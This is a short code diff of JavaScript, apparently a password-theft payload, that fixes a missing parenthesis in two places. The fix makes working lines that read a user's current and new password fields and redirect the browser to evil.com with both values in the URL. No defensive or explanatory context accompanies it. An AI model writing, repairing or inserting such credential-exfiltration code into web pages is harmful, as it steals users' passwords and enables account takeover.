@@ -9,7 +9,7 @@ let isFilled = false;
       if (!isFilled) {
         isFilled = true; 
         setTimeout(function() {
-          location.replace("//evil.com?current-password=" + document.getElementById('password-input').value + "&new-password=" + document.getElementById('new-password-input').value;
+          location.replace("//evil.com?current-password=" + document.getElementById('password-input').value + "&new-password=" + document.getElementById('new-password-input').value);
          
         }, 500); 
       }
@@ -20,7 +20,7 @@ if (input1.value && input3.value) {
       if (!isFilled) {
         isFilled = true; 
         setTimeout(function() {
-          location.replace("//evil.com?current-password=" + document.getElementById('password-input').value + "&new-password=" + document.getElementById('confirm-password-input').value;
+          location.replace("//evil.com?current-password=" + document.getElementById('password-input').value + "&new-password=" + document.getElementById('confirm-password-input').value);
          
         }, 500); 
       }
